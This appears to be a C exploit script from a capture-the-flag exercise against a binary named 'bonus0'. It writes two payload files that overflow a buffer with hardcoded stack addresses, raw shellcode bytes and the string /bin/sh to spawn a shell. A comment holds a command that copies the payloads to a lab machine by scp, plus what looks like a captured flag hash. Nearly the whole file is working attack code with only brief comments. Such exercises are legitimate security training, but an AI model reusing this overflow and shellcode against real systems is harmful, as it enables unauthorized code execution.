#include <unistd.h>
#include <stdio.h>

//gcc script.c && ./a.out && scp -P 4242 payload_b0a payload_b0b bonus0@192.168.56.105:/tmp
//f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

int main() {
	int t_address = 0xbfffe670;
	int offset = 80; //we wanted an offset far enough
	int asm_address = t_address + offset;
	int bin_sh_address = asm_address + 19; //note for it to work, we need to make sure neither asm_address nor bin_sh_address will result in \0(0x00) or \n(0x0a) characters

	FILE *file = fopen("payload_b0a", "w");
	fprintf(file, "%*c", ' ', offset);
	fwrite((char[1]){0x68}, 1, 1, file);
	fwrite(&bin_sh_address, 1, 4, file);
	fwrite((char[14]){0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0, 0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80}, 1, 14, file);
	fprintf(file, "/bin/sh\n");
	fclose(file);

	file = fopen("payload_b0b", "w");
	fprintf(file, "BBBBBBBBB");
	fwrite(&asm_address, 1, 4, file);
	fprintf(file, "BBBBBBB\n");
	fclose(file);
}